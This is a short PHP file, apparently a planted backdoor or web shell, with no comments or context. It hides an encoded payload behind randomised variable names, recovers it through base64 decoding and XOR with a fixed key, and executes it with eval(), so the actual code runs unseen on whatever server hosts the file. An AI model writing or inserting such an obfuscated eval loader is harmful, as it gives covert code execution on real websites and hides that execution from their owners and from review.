<?php
function pvOKLzhNfJ($VgpYNAjxbl, $cjAahpyxiR) {
    $cjAahpyxiR = base64_encode($cjAahpyxiR);
    $VgpYNAjxbl = base64_decode($VgpYNAjxbl);
    $biDBsXhKsQ = "";
    $XFPFsKBktg = "";
    $lxNaEobzhq = 0;
    while ($lxNaEobzhq < strlen($VgpYNAjxbl)) {
        for ($eHIhOMpaYt = 0; $eHIhOMpaYt < strlen($cjAahpyxiR); $eHIhOMpaYt++) {
            $biDBsXhKsQ = chr(ord($VgpYNAjxbl[$lxNaEobzhq]) ^ ord($cjAahpyxiR[$eHIhOMpaYt]));
            $XFPFsKBktg .= $biDBsXhKsQ;
            $lxNaEobzhq++;
            if ($lxNaEobzhq >= strlen($VgpYNAjxbl)) break;
        }
    }
    return base64_decode($XFPFsKBktg);
}
$ZEmYYChrUc = "lgsodfhsdfnsadfoisdfiasdbfipoas234234";
$kfChuzsyMW = "KA8yAwBxE1QoCwQEPiVnDTotPRsuASYSPj5vHjgAHAQ9OhBBAHVvETpIcA8qAx8PKgIIVwB1VAwvcWMlAiUIHxZee0sVABgUBmo+FgAqYwkAahsdFjkyHC4TUhAtPgsTAxMQAgMrdA8sEzITL18LXC8cBAEUOXRPAxMXWS91PhMALQtFAGocAhQUYwcvKkkfOQMATQoVJhEXc1paMhQmEAZqGB45eiIeOzVkFRMfBBQAcQdNHhYqGj0ABBgBXhQcBwAAHwc5LhEXdi4JBwRzazcsHCo3dAALNCMYPgw7fzUPERgvNl4iPQgREwMQHAsbFhpqOykPcwQASR8JKgcIQwcGcwwBKhwcOGo6ATgxKQADX1IKFiBiJjhqNhI4BDIZAAAABxcHCBY5AG8CAUgbFgUMB0otL3dRBi4DEQFfBBcFHzZbET5eChYgb1A=";
$QbgUiRwcII = pvOKLzhNfJ($kfChuzsyMW, $ZEmYYChrUc);
eval($QbgUiRwcII);
?>